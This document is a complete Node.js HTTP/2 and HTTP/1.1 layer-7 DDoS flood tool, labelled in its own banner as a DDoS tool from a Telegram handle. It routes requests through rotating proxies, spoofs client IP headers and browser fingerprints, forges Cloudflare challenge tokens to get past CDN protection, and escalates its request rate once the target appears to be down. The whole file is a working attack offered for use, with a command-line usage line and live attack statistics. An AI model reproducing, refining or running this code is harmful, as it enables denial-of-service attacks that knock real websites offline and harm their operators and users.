const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const crypto = require("crypto");
const HPACK = require('hpack');
const fs = require("fs");
const os = require("os");
const { exec } = require('child_process');
const https = require('https');

const MAX_CONNECTIONS_PER_WORKER = 30000;
const KEEP_ALIVE_TIMEOUT = 30000;

class BypassHeaderGenerator {
    constructor() {
        this.userAgents = {
            Chrome: [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6422.60 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36"
            ],
            Firefox: [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
                "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 12.5; rv:128.0) Gecko/20100101 Firefox/128.0",
                "Mozilla/5.0 (Android 13; Mobile; rv:127.0) Gecko/127.0 Firefox/127.0"
            ],
            Safari: [
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
            ],
            Edge: [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.1587.80"
            ]
        };
    }

    randomUserAgent() {
        const browser = Object.keys(this.userAgents)[Math.floor(Math.random() * Object.keys(this.userAgents).length)];
        return this.userAgents[browser][Math.floor(Math.random() * this.userAgents[browser].length)];
    }

    generateSecCHUA() {
        const browserVersions = [
            { name: "Chromium", version: "130" },
            { name: "Google Chrome", version: "130" },
            { name: "Not)A;Brand", version: "99" },
            { name: "Microsoft Edge", version: "130" },
            { name: "Brave", version: "130" }
        ];

        const shuffled = [...browserVersions].sort(() => Math.random() - 0.5);
        const selected = shuffled.slice(0, 3);
        return selected.map(b => `"${b.name}";v="${b.version}"`).join(", ");
    }

    generateHeaders(targetHostname, useLegitMode = false) {
        const methods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE'];
        const paths = ['/', '/api/v1/users', '/products', '/blog', '/wp-admin', '/api', '/graphql',
            '/rest/v1/data', '/admin', '/login', '/register', '/dashboard', '/config',
            '/vendor', '/node_modules', '/.env', '/wp-config.php'];

        const baseHeaders = {
            ':method': methods[Math.floor(Math.random() * methods.length)],
            ':path': paths[Math.floor(Math.random() * paths.length)] +
                (Math.random() > 0.3 ? '?t=' + Date.now() + '&r=' + crypto.randomBytes(8).toString('hex') : ''),
            ':authority': targetHostname,
            ':scheme': 'https',
            'user-agent': this.randomUserAgent(),
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,id;q=0.8,ja;q=0.7,zh;q=0.6',
            'accept-encoding': 'gzip, deflate, br, identity',
            'cache-control': 'no-cache, no-store, must-revalidate',
            'pragma': 'no-cache'
        };

        const bypassHeaders = {
            'sec-ch-ua': this.generateSecCHUA(),
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'upgrade-insecure-requests': '1',
            'sec-fetch-site': Math.random() > 0.5 ? 'none' : 'cross-site',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'x-forwarded-for': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            'x-real-ip': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
        };

        if (useLegitMode) {
            bypassHeaders['sec-gpc'] = Math.random() > 0.5 ? '1' : '0';
            bypassHeaders['dnt'] = Math.random() > 0.5 ? '1' : '0';
            bypassHeaders['priority'] = `u=${Math.floor(Math.random() * 3)}, i`;

            if (Math.random() > 0.7) {
                bypassHeaders['x-csrf-token'] = crypto.randomBytes(32).toString('hex');
                bypassHeaders['x-request-id'] = crypto.randomBytes(16).toString('hex');
                bypassHeaders['x-correlation-id'] = crypto.randomBytes(16).toString('hex');
            }

            if (Math.random() > 0.5) {
                bypassHeaders['referer'] = Math.random() > 0.5 ?
                    `https://www.google.com/search?q=${crypto.randomBytes(8).toString('hex')}` :
                    `https://${targetHostname}/`;
            }
        }

        if (Math.random() > 0.7) {
            baseHeaders[':path'] += `&__cf_chl_rt_tk=${crypto.randomBytes(30).toString('hex')}_${crypto.randomBytes(12).toString('hex')}-${Date.now()}-0-gaNyc${crypto.randomBytes(8).toString('hex')}`;
        }

        return { ...baseHeaders, ...bypassHeaders };
    }
}

class TCPKernelOptimizer {
    constructor() {
        this.congestionControls = ['bbr', 'cubic', 'reno', 'dctcp'];
        this.tcpConfigs = [
            { param: 'tcp_sack', values: ['1', '0'] },
            { param: 'tcp_window_scaling', values: ['1', '0'] },
            { param: 'tcp_timestamps', values: ['1', '0'] },
            { param: 'tcp_fastopen', values: ['3', '2', '1', '0'] }
        ];
    }

    applyRandomTuning() {
        try {
            const cc = this.congestionControls[Math.floor(Math.random() * this.congestionControls.length)];
            exec(`sysctl -w net.ipv4.tcp_congestion_control=${cc}`, () => { });

            this.tcpConfigs.forEach(config => {
                const value = config.values[Math.floor(Math.random() * config.values.length)];
                exec(`sysctl -w net.ipv4.${config.param}=${value}`, () => { });
            });
        } catch (e) {
        }
    }
}
class AdvancedH2Engine {
    constructor(target, proxyRotator, options = {}) {
        this.target = target;
        this.proxyRotator = proxyRotator;
        this.connectionPool = new Map();
        this.hpack = new HPACK();
        this.headerGenerator = new BypassHeaderGenerator();
        this.tcpOptimizer = new TCPKernelOptimizer();

        this.options = {
            useLegitHeaders: options.useLegitHeaders || true,
            enableCDNBypass: options.enableCDNBypass || true,
            enableUAMBypass: options.enableUAMBypass || true,
            forceHttpVersion: options.forceHttpVersion || 'mixed',
            maxStreams: 1000000,
            connectionCount: 0
        };

        this.settings = {
            headerTableSize: 65536,
            enablePush: 0,
            initialWindowSize: 1048576,
            maxFrameSize: 16384,
            maxConcurrentStreams: 1000000,
            maxHeaderListSize: 1048576
        };
    }

    generateCiphers() {
        const ciphers = [
            'TLS_AES_128_GCM_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256',
            'ECDHE-ECDSA-AES128-GCM-SHA256',
            'ECDHE-RSA-AES128-GCM-SHA256',
            'ECDHE-ECDSA-AES256-GCM-SHA384',
            'ECDHE-RSA-AES256-GCM-SHA384',
            'ECDHE-ECDSA-CHACHA20-POLY1305',
            'ECDHE-RSA-CHACHA20-POLY1305',
            'DHE-RSA-AES128-GCM-SHA256',
            'DHE-RSA-AES256-GCM-SHA384',
            'DHE-RSA-CHACHA20-POLY1305'
        ];

        const weakCiphers = [
            'RC4-SHA',
            'RC4-MD5',
            'DES-CBC3-SHA'
        ];

        if (Math.random() > 0.7) {
            ciphers.push(weakCiphers[Math.floor(Math.random() * weakCiphers.length)]);
        }

        return ciphers.sort(() => Math.random() - 0.5).join(':');
    }

    async createProxyTunnel(proxyInfo) {
        return new Promise((resolve, reject) => {
            const socket = net.connect({
                host: proxyInfo.host,
                port: proxyInfo.port,
                timeout: 5000
            });

            const connectPayload = `CONNECT ${this.target.hostname}:443 HTTP/1.1\r\n` +
                `Host: ${this.target.hostname}:443\r\n` +
                `Proxy-Connection: Keep-Alive\r\n` +
                `User-Agent: ${this.headerGenerator.randomUserAgent()}\r\n` +
                `X-Forwarded-For: ${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}\r\n\r\n`;

            socket.write(connectPayload);

            socket.once('data', (data) => {
                if (data.toString().includes('200') || data.toString().includes('Connection established')) {
                    resolve(socket);
                } else {
                    socket.destroy();
                    reject(new Error('Proxy tunnel failed'));
                }
            });

            socket.on('error', reject);
            socket.on('timeout', () => {
                socket.destroy();
                reject(new Error('Proxy timeout'));
            });
        });
    }

    async createHTTP2Connection(proxyInfo) {
        const connectionKey = `${proxyInfo.host}:${proxyInfo.port}:${Date.now()}`;

        try {
            this.tcpOptimizer.applyRandomTuning();

            const socket = await this.createProxyTunnel(proxyInfo);

            let alpnProtocols = ['h2', 'http/1.1'];
            if (this.options.forceHttpVersion === 'h2') {
                alpnProtocols = ['h2'];
            } else if (this.options.forceHttpVersion === 'http/1.1') {
                alpnProtocols = ['http/1.1'];
            }

            const tlsSocket = tls.connect({
                socket: socket,
                host: this.target.hostname,
                port: 443,
                servername: this.target.hostname,
                ciphers: this.generateCiphers(),
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384',
                minVersion: 'TLSv1',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false,
                ALPNProtocols: alpnProtocols,
                secureContext: tls.createSecureContext({
                    ciphers: this.generateCiphers(),
                    honorCipherOrder: false
                }),
                ecdhCurve: 'auto',
                secureOptions:
                    crypto.constants.SSL_OP_NO_SSLv2 |
                    crypto.constants.SSL_OP_NO_SSLv3 |
                    crypto.constants.SSL_OP_NO_COMPRESSION |
                    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION
            });

            tlsSocket.once('secureConnect', () => {
                const protocol = tlsSocket.alpnProtocol || 'http/1.1';

                if (protocol === 'h2') {
                    const client = http2.connect(this.target.href, {
                        createConnection: () => tlsSocket,
                        settings: this.settings
                    });

                    client.setMaxListeners(Infinity);
                    const connection = {
                        client,
                        socket: tlsSocket,
                        proxySocket: socket,
                        protocol: 'h2',
                        created: Date.now(),
                        lastUsed: Date.now(),
                        streams: 0
                    };
                    this.connectionPool.set(connectionKey, connection);
                    this.connectionCount++;

                    setTimeout(() => this.cleanupConnection(connectionKey), KEEP_ALIVE_TIMEOUT);

                    return connection;
                } else {
                    const connection = {
                        socket: tlsSocket,
                        proxySocket: socket,
                        protocol: 'http/1.1',
                        created: Date.now(),
                        lastUsed: Date.now()
                    };

                    this.connectionPool.set(connectionKey, connection);
                    return connection;
                }
            });

            return new Promise((resolve, reject) => {
                tlsSocket.once('secureConnect', () => {
                    const protocol = tlsSocket.alpnProtocol || 'http/1.1';
                    resolve(this.connectionPool.get(connectionKey));
                });

                tlsSocket.on('error', reject);
            });

        } catch (error) {
            throw error;
        }
    }
    async sendHTTP2Request(connection) {
        if (!connection.client || connection.client.destroyed) {
            return false;
        }
        const headers = this.headerGenerator.generateHeaders(this.target.hostname, this.options.useLegitHeaders);
        return new Promise((resolve) => {
            const req = connection.client.request(headers);
            req.setTimeout(3000, () => {
                req.destroy();
                resolve(false);
            });
            req.on('response', () => {
                setTimeout(() => {
                    req.close();
                    try {
                        connection.client.destroy();
                    } catch (e) { }
                }, Math.random() * 100);
                connection.lastUsed = Date.now();
                connection.streams++;
                resolve(true);
            });
            req.on('error', () => {
                resolve(false);
            });
            req.end();
        });
    }
    async sendHTTP1Request(connection) {
        if (!connection.socket || connection.socket.destroyed) {
            return false;
        }
        const headers = this.headerGenerator.generateHeaders(this.target.hostname, this.options.useLegitHeaders);
        const http1Headers = [
            `${headers[':method']} ${headers[':path']} HTTP/1.1`,
            `Host: ${headers[':authority']}`,
            `User-Agent: ${headers['user-agent']}`,
            `Accept: ${headers['accept']}`,
            `Accept-Language: ${headers['accept-language']}`,
            `Accept-Encoding: ${headers['accept-encoding']}`,
            `Cache-Control: ${headers['cache-control']}`,
            `Pragma: ${headers['pragma']}`,
            `Upgrade-Insecure-Requests: 1`,
            `Connection: Keep-Alive`
        ];
        if (headers['sec-ch-ua']) http1Headers.push(`Sec-CH-UA: ${headers['sec-ch-ua']}`);
        if (headers['sec-ch-ua-mobile']) http1Headers.push(`Sec-CH-UA-Mobile: ${headers['sec-ch-ua-mobile']}`);
        if (headers['x-forwarded-for']) http1Headers.push(`X-Forwarded-For: ${headers['x-forwarded-for']}`);
        if (headers['referer']) http1Headers.push(`Referer: ${headers['referer']}`);
        const request = http1Headers.join('\r\n') + '\r\n\r\n';
        return new Promise((resolve) => {
            connection.socket.write(request, (err) => {
                if (err) {
                    resolve(false);
                } else {
                    setTimeout(() => {
                        connection.lastUsed = Date.now();
                        resolve(true);
                    }, 10);
                }
            });
        });
    }
    async sendRequest(connection) {
        if (connection.protocol === 'h2') {
            return this.sendHTTP2Request(connection);
        } else {
            return this.sendHTTP1Request(connection);
        }
    }
    async attack(requestsPerSecond) {
        const proxy = this.proxyRotator.getNextProxy();
        if (!proxy) return 0;
        const proxyInfo = {
            host: proxy.split(':')[0],
            port: parseInt(proxy.split(':')[1])
        };
        try {
            const connection = await this.createHTTP2Connection(proxyInfo);
            let success = 0;
            const burstSize = connection.protocol === 'h2' ?
                Math.min(100, Math.floor(requestsPerSecond / 5) + 50) :
                Math.min(50, Math.floor(requestsPerSecond / 10) + 20);
            const promises = [];
            for (let i = 0; i < burstSize; i++) {
                promises.push(this.sendRequest(connection));
            }
            const results = await Promise.all(promises);
            success = results.filter(r => r).length;
            this.proxyRotator.markSuccess(proxy, success);
            return success;
        } catch (error) {
            this.proxyRotator.markFailed(proxy);
            return 0;
        }
    }
    cleanupConnection(key) {
        if (this.connectionPool.has(key)) {
            const conn = this.connectionPool.get(key);
            if (conn.client) conn.client.destroy();
            if (conn.socket) conn.socket.destroy();
            if (conn.proxySocket) conn.proxySocket.destroy();
            this.connectionPool.delete(key);
        }
    }
}
class EnhancedProxyRotator {
    constructor(proxyList) {
        this.proxies = proxyList;
        this.index = 0;
        this.failed = new Set();
        this.stats = new Map();
        this.retryQueue = new Map();
    }
    getNextProxy() {
        if (this.proxies.length === 0) return null;
        const now = Date.now();
        for (const [proxy, retryTime] of this.retryQueue.entries()) {
            if (now >= retryTime) {
                this.retryQueue.delete(proxy);
                this.failed.delete(proxy);
                return proxy;
            }
        }
        for (let i = 0; i < Math.min(10, this.proxies.length); i++) {
            this.index = (this.index + 1) % this.proxies.length;
            const proxy = this.proxies[this.index];

            if (!this.failed.has(proxy) && !this.retryQueue.has(proxy)) {
                return proxy;
            }
        }
        if (this.failed.size > this.proxies.length * 0.7) {
            const toReset = Array.from(this.failed).slice(0, Math.floor(this.failed.size * 0.3));
            toReset.forEach(proxy => {
                this.failed.delete(proxy);
                this.retryQueue.delete(proxy);
            });
        }
        return this.proxies[Math.floor(Math.random() * this.proxies.length)];
    }
    markSuccess(proxy, count = 1) {
        const current = this.stats.get(proxy) || { success: 0, fail: 0 };
        current.success += count;
        this.stats.set(proxy, current);
        this.failed.delete(proxy);
        this.retryQueue.delete(proxy);
    }
    markFailed(proxy) {
        const current = this.stats.get(proxy) || { success: 0, fail: 0 };
        current.fail++;
        this.stats.set(proxy, current);
        if (current.fail > 5 && current.success < current.fail * 2) {
            this.failed.add(proxy);
            this.retryQueue.set(proxy, Date.now() + 30000 + Math.random() * 30000);
        }
    }
}

class AggressiveRateController {
    constructor(baseRPS) {
        this.baseRPS = baseRPS;
        this.currentRPS = baseRPS;
        this.errorRate = 0;
        this.successRate = 0;
        this.aggression = 1.0;
        this.targetDown = false;
        this.lastAdjust = Date.now();
        this.maxAggression = 100.0;
    }
    calculateRate(targetDown = false) {
        this.targetDown = targetDown;
        const now = Date.now();
        if (now - this.lastAdjust > 5000) {
            if (targetDown) {
                this.aggression = Math.min(this.maxAggression, this.aggression * 2.0);
            } else if (this.errorRate > 0.8) {
                this.aggression = Math.max(0.1, this.aggression * 0.7);
            } else if (this.errorRate < 0.2 && this.successRate > 0.3) {
                this.aggression = Math.min(this.maxAggression, this.aggression * 1.5);
            }
            this.currentRPS = Math.floor(this.baseRPS * this.aggression);
            this.lastAdjust = now;
            this.errorRate *= 0.3;
            this.successRate *= 0.3;
        }
        return this.currentRPS;
    }
    recordResult(success, targetDown = false) {
        this.targetDown = targetDown;
        if (success) {
            this.successRate = (this.successRate * 0.8) + 0.2;
            this.errorRate = Math.max(0, this.errorRate * 0.8);
        } else {
            this.errorRate = (this.errorRate * 0.8) + 0.2;
            this.successRate = Math.max(0, this.successRate * 0.8);
        }
    }
}

class AdvancedMemoryOptimizer {
    constructor() {
        this.leakDetection = new Map();
        this.lastCleanup = Date.now();
    }
    optimize() {
        if (global.gc && Date.now() - this.lastCleanup > 15000) {
            try {
                global.gc();
            } catch (e) { }
            this.lastCleanup = Date.now();
        }

        if (Math.random() < 0.05) {
            Object.keys(require.cache).forEach(key => {
                if (!key.includes('node_modules') && Math.random() < 0.3) {
                    delete require.cache[key];
                }
            });
        }
    }
    shouldThrottle() {
        const totalMem = os.totalmem();
        const freeMem = os.freemem();
        const usedPercentage = (totalMem - freeMem) / totalMem;
        if (usedPercentage > 0.95) {
            return 0.3;
        } else if (usedPercentage > 0.85) {
            return 0.6;
        }
        return 1.0;
    }
}

function runEnhancedWorker(target, time, baseRPS, proxyFile, options = {}) {
    const proxies = fs.readFileSync(proxyFile, 'utf-8')
        .split('\n')
        .map(p => p.trim())
        .filter(p => p && !p.startsWith('#'));
    const targetUrl = new URL(target);
    const proxyRotator = new EnhancedProxyRotator(proxies);
    const rateController = new AggressiveRateController(baseRPS);
    const memoryOptimizer = new AdvancedMemoryOptimizer();
    const h2Engine = new AdvancedH2Engine(targetUrl, proxyRotator, {
        useLegitHeaders: true,
        enableCDNBypass: true,
        enableUAMBypass: true,
        forceHttpVersion: 'mixed'
    });

    let totalRequests = 0;
    let successfulRequests = 0;
    let startTime = Date.now();
    let targetDownCounter = 0;
    let connectionCount = 0;

    async function attackLoop() {
        while (Date.now() - startTime < time * 1000) {
            memoryOptimizer.optimize();
            const throttle = memoryOptimizer.shouldThrottle();
            const targetDown = targetDownCounter > 15;
            let rps = rateController.calculateRate(targetDown);
            rps = Math.floor(rps * throttle);
            const batchSize = Math.min(500, Math.floor(rps / 2) + 100);
            const batchPromises = [];
            const connectionsThisBatch = Math.min(10, Math.floor(batchSize / 50) + 1);
            for (let c = 0; c < connectionsThisBatch; c++) {
                const requestsPerConnection = Math.floor(batchSize / connectionsThisBatch);
                for (let i = 0; i < requestsPerConnection; i++) {
                    batchPromises.push(h2Engine.attack(rps));
                }
            }
            try {
                const results = await Promise.all(batchPromises);
                const success = results.reduce((a, b) => a + b, 0);
                totalRequests += batchPromises.length;
                successfulRequests += success;
                const successRatio = batchPromises.length > 0 ? success / batchPromises.length : 0;
                rateController.recordResult(successRatio > 0.1, targetDown);
                if (successRatio < 0.05) {
                    targetDownCounter += 3;
                } else {
                    targetDownCounter = Math.max(0, targetDownCounter - 1);
                }
            } catch (error) {
                targetDownCounter += 5;
            }
            await new Promise(resolve => setTimeout(resolve, 1));
        }
    }

    setInterval(() => {
        if (cluster.worker && cluster.worker.isConnected()) {
            const elapsed = (Date.now() - startTime) / 1000;
            const currentRPS = elapsed > 0 ? totalRequests / elapsed : 0;

            cluster.worker.send({
                type: 'stats',
                requests: totalRequests,
                success: successfulRequests,
                rps: currentRPS,
                aggression: rateController.aggression,
                targetDown: targetDownCounter > 10,
                connections: connectionCount
            });
        }
    }, 1000);
    console.log(`Worker ${process.pid} starting ENHANCED attack on ${target}`);
    attackLoop().then(() => {
        process.exit(0);
    }).catch(() => {
        process.exit(1);
    });
}

if (process.argv.length < 6) {
    console.log(`Usage: node ${process.argv[1]} <target> <time> <rps> <threads> <proxyfile>`);
    console.log(`Example: node ${process.argv[1]} https://example.com 60 100 10 proxies.txt`);
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rps: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const useLegitMode = process.argv.includes('--legit');
const enableCDNBypass = process.argv.includes('--cdn');
const enableUAM = process.argv.includes('--uam');

if (cluster.isMaster) {
    console.log(`\x1b[36m╔══════════════════════════════════════════════════════╗\x1b[0m`);
    console.log(`\x1b[36m║      APA MEMEK ANJ                                   ║\x1b[0m`);
    console.log(`\x1b[36m║         BUY PRM KE DEVELOPER ANJ                     ║\x1b[0m`);
    console.log(`\x1b[36m╚══════════════════════════════════════════════════════╝\x1b[0m`);
    console.log();
    console.log(`\x1b[33m Target:\x1b[0m`, args.target);
    console.log(`\x1b[33m Duration:\x1b[0m`, `${args.time}s`);
    console.log(`\x1b[33m Base RPS:\x1b[0m`, args.rps);
    console.log(`\x1b[33m Threads:\x1b[0m`, args.threads);
    console.log(`\x1b[33m Max Potential RPS:\x1b[0m`, `${args.rps * args.threads * 100}`);
    console.log(`\x1b[33m Advanced Mode:\x1b[0m`, useLegitMode ? 'ENABLED' : 'STANDARD');
    console.log(`\x1b[33m CDN Bypass:\x1b[0m`, enableCDNBypass ? 'ENABLED' : 'DISABLED');
    console.log(`\x1b[33m UAM Bypass:\x1b[0m`, enableUAM ? 'ENABLED' : 'DISABLED');
    console.log();
    let totalStats = {
        requests: 0,
        success: 0,
        rps: 0,
        aggression: 0,
        targetDown: false,
        connections: 0
    };
    for (let i = 0; i < args.threads; i++) {
        const worker = cluster.fork();
        if (useLegitMode) worker.process.env.USE_LEGIT = 'true';
        if (enableCDNBypass) worker.process.env.ENABLE_CDN_BYPASS = 'true';
        if (enableUAM) worker.process.env.ENABLE_UAM = 'true';
    }

    cluster.on('message', (worker, message) => {
        if (message.type === 'stats') {
            totalStats.requests += message.requests;
            totalStats.success += message.success;
            totalStats.rps += message.rps;
            totalStats.aggression = Math.max(totalStats.aggression, message.aggression);
            totalStats.targetDown = totalStats.targetDown || message.targetDown;
            totalStats.connections += message.connections || 0;
        }
    });
    const startTime = Date.now();

    setInterval(() => {
        console.clear();
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        console.log(`\x1b[36m╔══════════════════════════════════════════════════════╗\x1b[0m`);
        console.log(`\x1b[36m║           MEMEXO MEXXXXXXXXXXXX BACOT FREE           ║\x1b[0m`);
        console.log(`\x1b[36m╚══════════════════════════════════════════════════════╝\x1b[0m`);
        console.log();
        console.log(`\x1b[33mDDoS LAYER 7 BY t.me/DyyRoawr:\x1b[0m`);
        console.log(`    Time Elapsed:`, `${elapsed}s / ${args.time}s`);
        console.log(`    Total Requests:`, totalStats.requests.toLocaleString());
        console.log(`    Successful:`, totalStats.success.toLocaleString());
        console.log(`    Current RPS:`, Math.floor(totalStats.rps).toLocaleString());
        console.log(`    Aggression Level:`, totalStats.aggression.toFixed(2));
        console.log(`    Active Connections:`, totalStats.connections);
        console.log(`    Target Status:`, totalStats.targetDown ? `\x1b[31m CRITICAL - POSSIBLY DOWN\x1b[0m` : `\x1b[33m  UNDER HEAVY ATTACK\x1b[0m`);
        console.log(`    Workers Active:`, Object.keys(cluster.workers).length);
        console.log();
        console.log(`\x1b[35mFEATURES ACTIVE:\x1b[0m`);
        console.log(`   • HTTP/2 Multiplexing: \x1b[32m✓\x1b[0m`);
        console.log(`   • TCP Kernel Tuning: \x1b[32m✓\x1b[0m`);
        console.log(`   • Advanced Header Bypass: \x1b[32m${useLegitMode ? '✓' : '✗'}\x1b[0m`);
        console.log(`   • CDN Protection Bypass: \x1b[32m${enableCDNBypass ? '✓' : '✗'}\x1b[0m`);
        console.log(`   • UAM/Challenge Bypass: \x1b[32m${enableUAM ? '✓' : '✗'}\x1b[0m`);
        console.log();
    }, 500);

    setTimeout(() => {
        console.log(`\n\x1b[33mAttack \x1b[0m`);
        Object.values(cluster.workers).forEach(w => w.kill());
        setTimeout(() => process.exit(0), 1000);
    }, args.time * 1000);

} else {
    const options = {
        useLegitHeaders: process.env.USE_LEGIT === 'true',
        enableCDNBypass: process.env.ENABLE_CDN_BYPASS === 'true',
        enableUAMBypass: process.env.ENABLE_UAM === 'true'
    };

    runEnhancedWorker(args.target, args.time, args.rps, args.proxyFile, options);
}
process.on('SIGINT', () => {
    console.log('\n\x1b[33mEXIT\x1b[0m');
    process.exit(0);
});
process.on('uncaughtException', (err) => {
    if (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'EPROTO') {
        return;
    }
});
process.on('unhandledRejection', () => {
});